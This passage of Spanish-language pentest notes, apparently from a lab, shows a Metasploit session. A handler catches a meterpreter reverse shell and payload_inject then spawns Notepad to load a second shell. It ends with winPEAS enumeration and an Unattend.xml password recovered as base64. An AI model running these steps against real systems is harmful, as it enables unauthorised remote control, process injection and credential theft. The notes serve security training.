```sh

┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
[!] Unknown datastore option: payl�oad. Did you mean PAYLOAD?
payl�oad => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.40.129
LHOST => 192.168.40.129
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.40.129:443 
[*] Sending stage (230982 bytes) to 192.168.40.130
[*] Meterpreter session 1 opened (192.168.40.129:443 -> 192.168.40.130:49680) at 2026-02-25 22:23:16 -0500

meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/payload_inject
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/payload_inject) > set LHOST 192.168.40.129
LHOST => 192.168.40.129
msf exploit(windows/local/payload_inject) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/payload_inject) > set session 1
session => 1
msf exploit(windows/local/payload_inject) > run
[*] Started reverse TCP handler on 192.168.40.129:5555 
[*] Running module against DESKTOP-2OHT04K
[*] Spawned Notepad process 7268
[*] Injecting payload into 7268
[*] Preparing 'windows/meterpreter/reverse_tcp' for PID 7268
[*] Sending stage (188998 bytes) to 192.168.40.130
[*] Meterpreter session 2 opened (192.168.40.129:5555 -> 192.168.40.130:49681) at 2026-02-25 22:24:04 -0500

```

Revisión de los servicios o aplicaciones


```sh
.\winPEASany.exe quiet servicesinfo

.\winPEASany.exe quiet applicationsinfo

.\winPEASany.exe quiet filesinfo userinfo

```

Para credenciales

Si hay un autologon, la contraseña está guardada en algún lado para que pueda pasar eso

```sh
  [+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>
```

